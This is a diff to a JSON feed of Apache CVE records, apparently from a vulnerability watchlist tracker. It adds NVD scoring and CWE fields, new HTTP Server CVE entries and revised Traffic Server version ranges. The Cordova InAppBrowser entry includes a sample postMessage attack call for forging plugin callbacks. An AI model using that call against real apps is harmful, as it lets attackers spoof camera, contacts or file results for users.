@@ -1,7 +1,7 @@
 {
-  "generated_at": "2026-10-02T01:35:26+00:00",
+  "generated_at": "2026-10-02T08:31:01+00:00",
   "vendor": "apache_software_foundation",
-  "count": 1111,
+  "count": 1140,
   "items": [
     {
       "cve_id": "CVE-2022-22719",
@@ -27342,7 +27342,20 @@
         "vendor:apache software foundation"
       ],
       "active_threat": false,
-      "probability_score": 0.00134
+      "probability_score": 0.00134,
+      "nvd": {
+        "cvss_v3_score": null,
+        "cvss_v3_severity": null,
+        "cvss_v2_score": null,
+        "cvss_v2_severity": null,
+        "cwe_ids": [
+          "CWE-295",
+          "CWE-347",
+          "CWE-757"
+        ],
+        "cpe_count": 0,
+        "reference_count": 2
+      }
     },
     {
       "cve_id": "CVE-2026-102509",
@@ -27396,7 +27409,20 @@
         "vendor:apache software foundation"
       ],
       "active_threat": false,
-      "probability_score": 0.00401
+      "probability_score": 0.00401,
+      "nvd": {
+        "cvss_v3_score": null,
+        "cvss_v3_severity": null,
+        "cvss_v2_score": null,
+        "cvss_v2_severity": null,
+        "cwe_ids": [
+          "CWE-674",
+          "CWE-770",
+          "CWE-789"
+        ],
+        "cpe_count": 0,
+        "reference_count": 1
+      }
     },
     {
       "cve_id": "CVE-2026-102510",
@@ -27433,7 +27459,21 @@
         "vendor:apache software foundation"
       ],
       "active_threat": false,
-      "probability_score": 0.00328
+      "probability_score": 0.00328,
+      "nvd": {
+        "cvss_v3_score": null,
+        "cvss_v3_severity": null,
+        "cvss_v2_score": null,
+        "cvss_v2_severity": null,
+        "cwe_ids": [
+          "CWE-129",
+          "CWE-190",
+          "CWE-674",
+          "CWE-789"
+        ],
+        "cpe_count": 0,
+        "reference_count": 1
+      }
     },
     {
       "cve_id": "CVE-2026-102511",
@@ -27521,7 +27561,21 @@
         "vendor:apache software foundation"
       ],
       "active_threat": false,
-      "probability_score": 0.00177
+      "probability_score": 0.00177,
+      "nvd": {
+        "cvss_v3_score": null,
+        "cvss_v3_severity": null,
+        "cvss_v2_score": null,
+        "cvss_v2_severity": null,
+        "cwe_ids": [
+          "CWE-129",
+          "CWE-248",
+          "CWE-835",
+          "CWE-940"
+        ],
+        "cpe_count": 0,
+        "reference_count": 2
+      }
     },
     {
       "cve_id": "CVE-2026-22022",
@@ -37336,6 +37390,49 @@
       }
     },
     {
+      "cve_id": "CVE-2026-46729",
+      "description": "NULL Pointer Dereference vulnerability in Apache HTTP Servers mod_heartmonitor over unicast listener.\n\n\n\nThis issue affects Apache HTTP Server: from 2.4.0 through 2.4.68.",
+      "cvss_score": 7.5,
+      "cvss_severity": "HIGH",
+      "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+      "affected": [
+        {
+          "vendor": "apache software foundation",
+          "product": "apache http server",
+          "versions": [
+            {
+              "status": "affected",
+              "version": "2.4.0",
+              "lessThanOrEqual": "2.4.68",
+              "versionType": "semver"
+            }
+          ]
+        }
+      ],
+      "watchlist_hit": true,
+      "in_watchlist": true,
+      "in_patchthis": false,
+      "is_critical": false,
+      "priority_label": "",
+      "matched_terms": [
+        "product:apache http server",
+        "vendor:apache software foundation"
+      ],
+      "active_threat": false,
+      "probability_score": null,
+      "nvd": {
+        "cvss_v3_score": 7.5,
+        "cvss_v3_severity": "HIGH",
+        "cvss_v2_score": null,
+        "cvss_v2_severity": null,
+        "cwe_ids": [
+          "CWE-476"
+        ],
+        "cpe_count": 0,
+        "reference_count": 2
+      }
+    },
+    {
       "cve_id": "CVE-2026-46752",
       "description": "Redis Lua HEAP overflow in cjson library vulnerability in Apache Kvrocks.\n\nThis issue affects Apache Kvrocks: from 2.0.4 through 2.15.0.\n\nUsers are recommended to upgrade to version 2.16.0, which fixes the issue.",
       "cvss_score": 10.0,
@@ -37632,6 +37729,49 @@
       }
     },
     {
+      "cve_id": "CVE-2026-47360",
+      "description": "Exposure of Sensitive Information to an Unauthorized Actor vulnerability in Apache HTTP Server's mod_session_cookie module.\n\n\n\n\u00a0  \nWhen SessionCookieRemove changes across internal redirects, the session cookie may still be passed to a backend server.\n\n\n\n\n\nThis issue affects Apache HTTP Server: from 2.4.0 through 2.4.68.",
+      "cvss_score": 7.5,
+      "cvss_severity": "HIGH",
+      "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+      "affected": [
+        {
+          "vendor": "apache software foundation",
+          "product": "apache http server",
+          "versions": [
+            {
+              "status": "affected",
+              "version": "2.4.0",
+              "lessThanOrEqual": "2.4.68",
+              "versionType": "semver"
+            }
+          ]
+        }
+      ],
+      "watchlist_hit": true,
+      "in_watchlist": true,
+      "in_patchthis": false,
+      "is_critical": false,
+      "priority_label": "",
+      "matched_terms": [
+        "product:apache http server",
+        "vendor:apache software foundation"
+      ],
+      "active_threat": false,
+      "probability_score": null,
+      "nvd": {
+        "cvss_v3_score": 7.5,
+        "cvss_v3_severity": "HIGH",
+        "cvss_v2_score": null,
+        "cvss_v2_severity": null,
+        "cwe_ids": [
+          "CWE-200"
+        ],
+        "cpe_count": 0,
+        "reference_count": 2
+      }
+    },
+    {
       "cve_id": "CVE-2026-47430",
       "description": "## Summary\n\nThe iOS implementation of `cordova-plugin-inappbrowser` passes the `id` field from a `WKScriptMessage` body to `commandDelegate sendPluginResult:callbackId:` with no format validation (`CDVWKInAppBrowser.m:560\u2013574`). Any web content loaded inside the InAppBrowser can fire any pending Cordova callback in the host app by posting a message whose `id` field is a guessable or enumerated callback identifier. An attack abusing this weakness must be tailored to the specific plugins and callback IDs the host app uses. Though an attacker with knowledge of common Cordova plugin configurations could craft reusable payloads targeting widely-adopted plugins.\n\n\n## Impact\n\nAn unauthenticated remote attacker who controls content displayed in the InAppBrowser \u2014 via a URL the app opens (OAuth redirect, marketing link, deep-link target) or a network interception \u2014 can call `window.webkit.messageHandlers.cordova_iab.postMessage({id: '<victim-callback-id>', d: '...'})` to fire callbacks belonging to any other installed Cordova plugin (Camera, Contacts, File, Geolocation). Cordova callback IDs follow the predictable format `<PluginName><sequential-integer>`, making enumeration feasible. Successful exploitation allows the attacker to spoof plugin results across trust boundaries \u2014 for example, injecting a forged camera approval, a fabricated contacts list, or a crafted file-read response.\n\nThis issue affects Cordova Plugin InAppBrowser: from 3.1.0 through 6.0.0.\n\nUsers are recommended to upgrade to version 6.0.1, which fixes the issue.",
       "cvss_score": 9.5,
@@ -37757,6 +37897,49 @@
           "CWE-22"
         ],
         "cpe_count": 13,
+        "reference_count": 2
+      }
+    },
+    {
+      "cve_id": "CVE-2026-48005",
+      "description": "Missing authentication checks in mod_auth_digest in Apache Software Foundation Apache HTTP Server before 2.4.69 on all platforms allows an unauthenticated remote client to cause a denial of service (forced re-authentication) via forged Authorization headers when Digest authentication is enabled with AuthDigestNcCheck .\n\nUsers are recommended to upgrade to version 2.4.69, which fixes this issue.",
+      "cvss_score": 7.5,
+      "cvss_severity": "HIGH",
+      "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+      "affected": [
+        {
+          "vendor": "apache software foundation",
+          "product": "apache http server",
+          "versions": [
+            {
+              "status": "affected",
+              "version": "2.4.0",
+              "lessThanOrEqual": "2.4.68",
+              "versionType": "semver"
+            }
+          ]
+        }
+      ],
+      "watchlist_hit": true,
+      "in_watchlist": true,
+      "in_patchthis": false,
+      "is_critical": false,
+      "priority_label": "",
+      "matched_terms": [
+        "product:apache http server",
+        "vendor:apache software foundation"
+      ],
+      "active_threat": false,
+      "probability_score": null,
+      "nvd": {
+        "cvss_v3_score": 7.5,
+        "cvss_v3_severity": "HIGH",
+        "cvss_v2_score": null,
+        "cvss_v2_severity": null,
+        "cwe_ids": [
+          "CWE-306"
+        ],
+        "cpe_count": 0,
         "reference_count": 2
       }
     },
@@ -41613,6 +41796,92 @@
       }
     },
     {
+      "cve_id": "CVE-2026-56153",
+      "description": "Out-of-bounds Write vulnerability in Apache HTTP Server's mod_charset_lite.\n\n\n\nThis issue affects Apache HTTP Server: from 2.4.0 through 2.4.68.",
+      "cvss_score": 7.5,
+      "cvss_severity": "HIGH",
+      "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+      "affected": [
+        {
+          "vendor": "apache software foundation",
+          "product": "apache http server",
+          "versions": [
+            {
+              "status": "affected",
+              "version": "2.4.0",
+              "lessThanOrEqual": "2.4.68",
+              "versionType": "semver"
+            }
+          ]
+        }
+      ],
+      "watchlist_hit": true,
+      "in_watchlist": true,
+      "in_patchthis": false,
+      "is_critical": false,
+      "priority_label": "",
+      "matched_terms": [
+        "product:apache http server",
+        "vendor:apache software foundation"
+      ],
+      "active_threat": false,
+      "probability_score": null,
+      "nvd": {
+        "cvss_v3_score": 7.5,
+        "cvss_v3_severity": "HIGH",
+        "cvss_v2_score": null,
+        "cvss_v2_severity": null,
+        "cwe_ids": [
+          "CWE-787"
+        ],
+        "cpe_count": 0,
+        "reference_count": 2
+      }
+    },
+    {
+      "cve_id": "CVE-2026-56154",
+      "description": "Use After Free vulnerability in Apache HTTP Server's mod_rewrite when using lookahead (%{LA-U:HTTP:...})\n\n\n\nThis issue affects Apache HTTP Server: from 2.4.0 through 2.4.68.",
+      "cvss_score": 9.8,
+      "cvss_severity": "CRITICAL",
+      "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+      "affected": [
+        {
+          "vendor": "apache software foundation",
+          "product": "apache http server",
+          "versions": [
+            {
+              "status": "affected",
+              "version": "2.4.0",
+              "lessThanOrEqual": "2.4.68",
+              "versionType": "semver"
+            }
+          ]
+        }
+      ],
+      "watchlist_hit": true,
+      "in_watchlist": true,
+      "in_patchthis": false,
+      "is_critical": false,
+      "priority_label": "",
+      "matched_terms": [
+        "product:apache http server",
+        "vendor:apache software foundation"
+      ],
+      "active_threat": false,
+      "probability_score": null,
+      "nvd": {
+        "cvss_v3_score": 9.8,
+        "cvss_v3_severity": "CRITICAL",
+        "cvss_v2_score": null,
+        "cvss_v2_severity": null,
+        "cwe_ids": [
+          "CWE-416"
+        ],
+        "cpe_count": 0,
+        "reference_count": 2
+      }
+    },
+    {
       "cve_id": "CVE-2026-56207",
       "description": "Signature of Bearer token is not verified in last step of SAML2 authentication for Impala's hs2-http interface, allowing altering user name and acting as another user.\n\n\n\nThis issue affects Apache Impala: >=4.0.0.\n\n\n\nUsers are recommended to upgrade to version 4.5.2, which fixes this issue.",
       "cvss_score": 9.8,
@@ -41696,6 +41965,49 @@
         ],
         "cpe_count": 1,
         "reference_count": 3
+      }
+    },
+    {
+      "cve_id": "CVE-2026-56449",
+      "description": "Out-of-bounds Write vulnerability in Apache HTTP Server's mod_proxy_html with crafted HTTP response bodies.\n\n\n\nThis issue affects Apache HTTP Server: from 2.4.0 through 2.4.68.",
+      "cvss_score": 7.5,
+      "cvss_severity": "HIGH",
+      "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+      "affected": [
+        {
+          "vendor": "apache software foundation",
+          "product": "apache http server",
+          "versions": [
+            {
+              "status": "affected",
+              "version": "2.4.0",
+              "lessThanOrEqual": "2.4.68",
+              "versionType": "semver"
+            }
+          ]
+        }
+      ],
+      "watchlist_hit": true,
+      "in_watchlist": true,
+      "in_patchthis": false,
+      "is_critical": false,
+      "priority_label": "",
+      "matched_terms": [
+        "product:apache http server",
+        "vendor:apache software foundation"
+      ],
+      "active_threat": false,
+      "probability_score": null,
+      "nvd": {
+        "cvss_v3_score": 7.5,
+        "cvss_v3_severity": "HIGH",
+        "cvss_v2_score": null,
+        "cvss_v2_severity": null,
+        "cwe_ids": [
+          "CWE-787"
+        ],
+        "cpe_count": 0,
+        "reference_count": 2
       }
     },
     {
@@ -42202,7 +42514,7 @@
     },
     {
       "cve_id": "CVE-2026-57834",
-      "description": "Apache Traffic Server allows request smuggling if chunked messages are malformed.\n\nThis issue affects Apache Traffic Server: from 8.0.0 through 8.1.9, from 9.0.0 through 9.2.14, from 10.0.0 through 10.1.3.\n\nUsers are recommended to upgrade to version 9.2.15 or 10.1.4, which fix the issue.",
+      "description": "Apache Traffic Server allows request smuggling if chunked messages are malformed.\n\n\n\nThis issue affects Apache Traffic Server: from 8.0.0 through 8.1.11, from 9.0.0 through 9.2.14, from 10.0.0 through 10.1.3.\n\n\n\nUsers are recommended to upgrade to version 9.2.15 or 10.1.4, which fix the issue.",
       "cvss_score": 10.0,
       "cvss_severity": "CRITICAL",
       "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:L",
@@ -42212,21 +42524,21 @@
           "product": "apache traffic server",
           "versions": [
             {
-              "lessThanOrEqual": "8.1.9",
               "status": "affected",
               "version": "8.0.0",
+              "lessThanOrEqual": "8.1.11",
               "versionType": "semver"
             },
             {
-              "lessThanOrEqual": "9.2.14",
               "status": "affected",
               "version": "9.0.0",
+              "lessThanOrEqual": "9.2.14",
               "versionType": "semver"
             },
             {
-              "lessThanOrEqual": "10.1.3",
               "status": "affected",
               "version": "10.0.0",
+              "lessThanOrEqual": "10.1.3",
               "versionType": "semver"
             }
           ]
@@ -42340,6 +42652,49 @@
         ],
         "cpe_count": 0,
         "reference_count": 5
+      }
+    },
+    {
+      "cve_id": "CVE-2026-57941",
+      "description": "Use After Free vulnerability in Apache HTTP Server's mod_http2\u00a0via shared session->bbtmp re-entrancy\n\n\n\nThis issue affects Apache HTTP Server: from 2.4.0 through 2.4.68.",
+      "cvss_score": 9.8,
+      "cvss_severity": "CRITICAL",
+      "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+      "affected": [
+        {
+          "vendor": "apache software foundation",
+          "product": "apache http server",
+          "versions": [
+            {
+              "status": "affected",
+              "version": "2.4.0",
+              "lessThanOrEqual": "2.4.68",
+              "versionType": "semver"
+            }
+          ]
+        }
+      ],
+      "watchlist_hit": true,
+      "in_watchlist": true,
+      "in_patchthis": false,
+      "is_critical": false,
+      "priority_label": "",
+      "matched_terms": [
+        "product:apache http server",
+        "vendor:apache software foundation"
+      ],
+      "active_threat": false,
+      "probability_score": null,
+      "nvd": {
+        "cvss_v3_score": 9.8,
+        "cvss_v3_severity": "CRITICAL",
+        "cvss_v2_score": null,
+        "cvss_v2_severity": null,
+        "cwe_ids": [
+          "CWE-416"
+        ],
+        "cpe_count": 0,
+        "reference_count": 2
       }
     },
     {
@@ -42486,7 +42841,7 @@
     },
     {
       "cve_id": "CVE-2026-58150",
-      "description": "Apache Traffic Server does not reject Transfer-Encoding in HTTP/2 requests, allowing downgrade request smuggling.\n\nThis issue affects Apache Traffic Server: from 8.0.0 through 8.1.9, from 9.0.0 through 9.2.14, from 10.0.0 through 10.1.3.\n\nUsers are recommended to upgrade to version 9.2.15 or 10.1.4, which fix the issue.",
+      "description": "Apache Traffic Server does not reject Transfer-Encoding in HTTP/2 requests, allowing downgrade request smuggling.\n\n\n\nThis issue affects Apache Traffic Server: from 8.0.0 through 8.1.11, from 9.0.0 through 9.2.14, from 10.0.0 through 10.1.3.\n\n\n\nUsers are recommended to upgrade to version 9.2.15 or 10.1.4, which fix the issue.",
       "cvss_score": 10.0,
       "cvss_severity": "CRITICAL",
       "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N",
@@ -42496,21 +42851,21 @@
           "product": "apache traffic server",
           "versions": [
             {
-              "lessThanOrEqual": "8.1.9",
               "status": "affected",
               "version": "8.0.0",
+              "lessThanOrEqual": "8.1.11",
               "versionType": "semver"
             },
             {
-              "lessThanOrEqual": "9.2.14",
               "status": "affected",
               "version": "9.0.0",
+              "lessThanOrEqual": "9.2.14",
               "versionType": "semver"
             },
             {
-              "lessThanOrEqual": "10.1.3",
               "status": "affected",
               "version": "10.0.0",
+              "lessThanOrEqual": "10.1.3",
               "versionType": "semver"
             }
           ]
@@ -42541,7 +42896,7 @@
     },
     {
       "cve_id": "CVE-2026-58151",
-      "description": "Apache Traffic Server can be crashed or driven to resource exhaustion by abusive HTTP/2 framing and flow-control.\n\nThis issue affects Apache Traffic Server: from 8.0.0 through 8.1.9, from 9.0.0 through 9.2.14, from 10.0.0 through 10.1.3.\n\nUsers are recommended to upgrade to version 9.2.15 or 10.1.4, which fix the issue.",
+      "description": "Apache Traffic Server can be crashed or driven to resource exhaustion by abusive HTTP/2 framing and flow-control.\n\n\n\nThis issue affects Apache Traffic Server: from 8.0.0 through 8.1.11, from 9.0.0 through 9.2.14, from 10.0.0 through 10.1.3.\n\n\n\nUsers are recommended to upgrade to version 9.2.15 or 10.1.4, which fix the issue.",
       "cvss_score": 7.5,
       "cvss_severity": "HIGH",
       "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
@@ -42551,21 +42906,21 @@
           "product": "apache traffic server",
           "versions": [
             {
-              "lessThanOrEqual": "8.1.9",
               "status": "affected",
               "version": "8.0.0",
+              "lessThanOrEqual": "8.1.11",
               "versionType": "semver"
             },
             {
-              "lessThanOrEqual": "9.2.14",
               "status": "affected",
               "version": "9.0.0",
+              "lessThanOrEqual": "9.2.14",
               "versionType": "semver"
             },
             {
-              "lessThanOrEqual": "10.1.3",
               "status": "affected",
               "version": "10.0.0",
+              "lessThanOrEqual": "10.1.3",
               "versionType": "semver"
             }
           ]
@@ -42639,7 +42994,7 @@
     },
     {
       "cve_id": "CVE-2026-58154",
-      "description": "Apache Traffic Server can write out of bounds or overflow integers while parsing MIME and HTTP headers.\n\nThis issue affects Apache Traffic Server: from 8.0.0 through 8.1.9, from 9.0.0 through 9.2.14, from 10.0.0 through 10.1.3.\n\nUsers are recommended to upgrade to version 9.2.15 or 10.1.4, which fix the issue.",
+      "description": "Apache Traffic Server can write out of bounds or overflow integers while parsing MIME and HTTP headers.\n\n\n\nThis issue affects Apache Traffic Server: from 8.0.0 through 8.1.11, from 9.0.0 through 9.2.14, from 10.0.0 through 10.1.3.\n\n\n\nUsers are recommended to upgrade to version 9.2.15 or 10.1.4, which fix the issue.",
       "cvss_score": 8.9,
       "cvss_severity": "HIGH",
       "cvss_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:L/I:H/A:H",
@@ -42649,21 +43004,21 @@
           "product": "apache traffic server",
           "versions": [
             {
-              "lessThanOrEqual": "8.1.9",
               "status": "affected",
               "version": "8.0.0",
+              "lessThanOrEqual": "8.1.11",
               "versionType": "semver"
             },
             {
-              "lessThanOrEqual": "9.2.14",
               "status": "affected",
               "version": "9.0.0",
+              "lessThanOrEqual": "9.2.14",
               "versionType": "semver"
             },
             {
-              "lessThanOrEqual": "10.1.3",
               "status": "affected",
               "version": "10.0.0",
+              "lessThanOrEqual": "10.1.3",
               "versionType": "semver"
             }
           ]
@@ -42694,7 +43049,7 @@
     },
     {
       "cve_id": "CVE-2026-58155",
-      "description": "Apache Traffic Server truncates over-long header names, allowing header aliasing, request smuggling, and policy bypass.\n\nThis issue affects Apache Traffic Server: from 8.0.0 through 8.1.9, from 9.0.0 through 9.2.14, from 10.0.0 through 10.1.3.\n\nUsers are recommended to upgrade to version 9.2.15 or 10.1.4, which fix the issue.",
+      "description": "Apache Traffic Server truncates over-long header names, allowing header aliasing, request smuggling, and policy bypass.\n\n\n\nThis issue affects Apache Traffic Server: from 8.0.0 through 8.1.11, from 9.0.0 through 9.2.14, from 10.0.0 through 10.1.3.\n\n\n\nUsers are recommended to upgrade to version 9.2.15 or 10.1.4, which fix the issue.",
       "cvss_score": 9.3,
       "cvss_severity": "CRITICAL",
       "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:H/A:N",
@@ -42704,21 +43059,21 @@
           "product": "apache traffic server",
           "versions": [
             {
-              "lessThanOrEqual": "8.1.9",
               "status": "affected",
               "version": "8.0.0",
+              "lessThanOrEqual": "8.1.11",
               "versionType": "semver"
             },
             {
-              "lessThanOrEqual": "9.2.14",
               "status": "affected",
               "version": "9.0.0",
+              "lessThanOrEqual": "9.2.14",
               "versionType": "semver"
             },
             {
-              "lessThanOrEqual": "10.1.3",
               "status": "affected",
               "version": "10.0.0",
+              "lessThanOrEqual": "10.1.3",
               "versionType": "semver"
             }
           ]
@@ -42749,7 +43104,7 @@
     },
     {
       "cve_id": "CVE-2026-58157",
-      "description": "Apache Traffic Server can reuse server sessions and tunnels improperly, exposing data across client connections.\n\nThis issue affects Apache Traffic Server: from 8.0.0 through 8.1.9, from 9.0.0 through 9.2.14, from 10.0.0 through 10.1.3.\n\nUsers are recommended to upgrade to version 9.2.15 or 10.1.4, which fix the issue.",
+      "description": "Apache Traffic Server can reuse server sessions and tunnels improperly, exposing data across client connections.\n\n\n\nThis issue affects Apache Traffic Server: from 8.0.0 through 8.1.11, from 9.0.0 through 9.2.14, from 10.0.0 through 10.1.3.\n\n\n\nUsers are recommended to upgrade to version 9.2.15 or 10.1.4, which fix the issue.",
       "cvss_score": 8.7,
       "cvss_severity": "HIGH",
       "cvss_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:N",
@@ -42759,21 +43114,21 @@
           "product": "apache traffic server",
           "versions": [
             {
-              "lessThanOrEqual": "8.1.9",
               "status": "affected",
               "version": "8.0.0",
+              "lessThanOrEqual": "8.1.11",
               "versionType": "semver"
             },
             {
-              "lessThanOrEqual": "9.2.14",
               "status": "affected",
               "version": "9.0.0",
+              "lessThanOrEqual": "9.2.14",
               "versionType": "semver"
             },
             {
-              "lessThanOrEqual": "10.1.3",
               "status": "affected",
               "version": "10.0.0",
+              "lessThanOrEqual": "10.1.3",
               "versionType": "semver"
             }
           ]
@@ -42804,7 +43159,7 @@
     },
     {
       "cve_id": "CVE-2026-58159",
-      "description": "Apache Traffic Server can bypass IP access controls on UDS listeners and through ACL matching errors.\n\nThis issue affects Apache Traffic Server: from 8.0.0 through 8.1.9, from 9.0.0 through 9.2.14, from 10.0.0 through 10.1.3.\n\nUsers are recommended to upgrade to version 9.2.15 or 10.1.4, which fix the issue.",
+      "description": "Apache Traffic Server can bypass IP access controls on UDS listeners and through ACL matching errors.\n\n\n\nThis issue affects Apache Traffic Server: from 8.0.0 through 8.1.11, from 9.0.0 through 9.2.14, from 10.0.0 through 10.1.3.\n\n\n\nUsers are recommended to upgrade to version 9.2.15 or 10.1.4, which fix the issue.",
       "cvss_score": 8.2,
       "cvss_severity": "HIGH",
       "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:L",
@@ -42814,21 +43169,21 @@
           "product": "apache traffic server",
           "versions": [
             {
-              "lessThanOrEqual": "8.1.9",
               "status": "affected",
               "version": "8.0.0",
+              "lessThanOrEqual": "8.1.11",
               "versionType": "semver"
             },
             {
-              "lessThanOrEqual": "9.2.14",
               "status": "affected",
               "version": "9.0.0",
+              "lessThanOrEqual": "9.2.14",
               "versionType": "semver"
             },
             {
-              "lessThanOrEqual": "10.1.3",
               "status": "affected",
               "version": "10.0.0",
+              "lessThanOrEqual": "10.1.3",
               "versionType": "semver"
             }
           ]
@@ -42859,7 +43214,7 @@
     },
     {
       "cve_id": "CVE-2026-58161",
-      "description": "Apache Traffic Server can crash from null dereferences and dangling references in TLS and SNI handling.\n\nThis issue affects Apache Traffic Server: from 8.0.0 through 8.1.9, from 9.0.0 through 9.2.14, from 10.0.0 through 10.1.3.\n\nUsers are recommended to upgrade to version 9.2.15 or 10.1.4, which fix the issue.",
+      "description": "Apache Traffic Server can crash from null dereferences and dangling references in TLS and SNI handling.\n\n\n\nThis issue affects Apache Traffic Server: from 8.0.0 through 8.1.11, from 9.0.0 through 9.2.14, from 10.0.0 through 10.1.3.\n\n\n\nUsers are recommended to upgrade to version 9.2.15 or 10.1.4, which fix the issue.",
       "cvss_score": 7.5,
       "cvss_severity": "HIGH",
       "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
@@ -42869,21 +43224,21 @@
           "product": "apache traffic server",
           "versions": [
             {
-              "lessThanOrEqual": "8.1.9",
               "status": "affected",
               "version": "8.0.0",
+              "lessThanOrEqual": "8.1.11",
               "versionType": "semver"
             },
             {
-              "lessThanOrEqual": "9.2.14",
               "status": "affected",
               "version": "9.0.0",
+              "lessThanOrEqual": "9.2.14",
               "versionType": "semver"
             },
             {
-              "lessThanOrEqual": "10.1.3",
               "status": "affected",
               "version": "10.0.0",
+              "lessThanOrEqual": "10.1.3",
               "versionType": "semver"
             }
           ]
@@ -42914,7 +43269,7 @@
     },
     {
       "cve_id": "CVE-2026-58162",
-      "description": "The Apache Traffic Server certifier plugin generates certificates based on attacker-controlled client SNI.\n\nThis issue affects Apache Traffic Server: from 8.0.0 through 8.1.9, from 9.0.0 through 9.2.14, from 10.0.0 through 10.1.3.\n\nUsers are recommended to upgrade to version 9.2.15 or 10.1.4, which fix the issue.",
+      "description": "The Apache Traffic Server certifier plugin generates certificates based on attacker-controlled client SNI.\n\n\n\nThis issue affects Apache Traffic Server: from 8.0.0 through 8.1.11, from 9.0.0 through 9.2.14, from 10.0.0 through 10.1.3.\n\n\n\nUsers are recommended to upgrade to version 9.2.15 or 10.1.4, which fix the issue.",
       "cvss_score": 10.0,
       "cvss_severity": "CRITICAL",
       "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:H/A:H",
@@ -42924,21 +43279,21 @@
           "product": "apache traffic server",
           "versions": [
             {
-              "lessThanOrEqual": "8.1.9",
               "status": "affected",
               "version": "8.0.0",
+              "lessThanOrEqual": "8.1.11",
               "versionType": "semver"
             },
             {
-              "lessThanOrEqual": "9.2.14",
               "status": "affected",
               "version": "9.0.0",
+              "lessThanOrEqual": "9.2.14",
               "versionType": "semver"
             },
             {
-              "lessThanOrEqual": "10.1.3",
               "status": "affected",
               "version": "10.0.0",
+              "lessThanOrEqual": "10.1.3",
               "versionType": "semver"
             }
           ]
@@ -42969,7 +43324,7 @@
     },
     {
       "cve_id": "CVE-2026-58163",
-      "description": "Apache Traffic Server mishandles on-disk cache fields and object lifetimes, corrupting state or crashing.\n\nThis issue affects Apache Traffic Server: from 8.0.0 through 8.1.9, from 9.0.0 through 9.2.14, from 10.0.0 through 10.1.3.\n\nUsers are recommended to upgrade to version 9.2.15 or 10.1.4, which fix the issue.",
+      "description": "Apache Traffic Server mishandles on-disk cache fields and object lifetimes, corrupting state or crashing.\n\n\n\nThis issue affects Apache Traffic Server: from 8.0.0 through 8.1.11, from 9.0.0 through 9.2.14, from 10.0.0 through 10.1.3.\n\n\n\nUsers are recommended to upgrade to version 9.2.15 or 10.1.4, which fix the issue.",
       "cvss_score": 7.5,
       "cvss_severity": "HIGH",
       "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N",
@@ -42979,21 +43334,21 @@
           "product": "apache traffic server",
           "versions": [
             {
-              "lessThanOrEqual": "8.1.9",
               "status": "affected",
               "version": "8.0.0",
+              "lessThanOrEqual": "8.1.11",
               "versionType": "semver"
             },
             {
-              "lessThanOrEqual": "9.2.14",
               "status": "affected",
               "version": "9.0.0",
+              "lessThanOrEqual": "9.2.14",
               "versionType": "semver"
             },
             {
-              "lessThanOrEqual": "10.1.3",
               "status": "affected",
               "version": "10.0.0",
+              "lessThanOrEqual": "10.1.3",
               "versionType": "semver"
             }
           ]
@@ -43024,7 +43379,7 @@
     },
     {
       "cve_id": "CVE-2026-58164",
-      "description": "Apache Traffic Server has use-after-free and time-of-check/time-of-use errors in remap configuration handling.\n\nThis issue affects Apache Traffic Server: from 8.0.0 through 8.1.9, from 9.0.0 through 9.2.14, from 10.0.0 through 10.1.3.\n\nUsers are recommended to upgrade to version 9.2.15 or 10.1.4, which fix the issue.",
+      "description": "Apache Traffic Server has use-after-free and time-of-check/time-of-use errors in remap configuration handling.\n\n\n\nThis issue affects Apache Traffic Server: from 8.0.0 through 8.1.11, from 9.0.0 through 9.2.14, from 10.0.0 through 10.1.3.\n\n\n\nUsers are recommended to upgrade to version 9.2.15 or 10.1.4, which fix the issue.",
       "cvss_score": 7.5,
       "cvss_severity": "HIGH",
       "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
@@ -43034,21 +43389,21 @@
           "product": "apache traffic server",
           "versions": [
             {
-              "lessThanOrEqual": "8.1.9",
               "status": "affected",
               "version": "8.0.0",
+              "lessThanOrEqual": "8.1.11",
               "versionType": "semver"
             },
             {
-              "lessThanOrEqual": "9.2.14",
               "status": "affected",
               "version": "9.0.0",
+              "lessThanOrEqual": "9.2.14",
               "versionType": "semver"
             },
             {
-              "lessThanOrEqual": "10.1.3",
               "status": "affected",
               "version": "10.0.0",
+              "lessThanOrEqual": "10.1.3",
               "versionType": "semver"
             }
           ]
@@ -43079,7 +43434,7 @@
     },
     {
       "cve_id": "CVE-2026-58175",
-      "description": "Apache Traffic Server leaks memory when handling HostDB SRV records.\n\nThis issue affects Apache Traffic Server: from 8.0.0 through 8.1.9, from 9.0.0 through 9.2.14, from 10.0.0 through 10.1.3.\n\nUsers are recommended to upgrade to version 9.2.15 or 10.1.4, which fix the issue.",
+      "description": "Apache Traffic Server leaks memory when handling HostDB SRV records.\n\n\n\nThis issue affects Apache Traffic Server: from 8.0.0 through 8.1.11, from 9.0.0 through 9.2.14, from 10.0.0 through 10.1.3.\n\n\n\nUsers are recommended to upgrade to version 9.2.15 or 10.1.4, which fix the issue.",
       "cvss_score": 7.5,
       "cvss_severity": "HIGH",
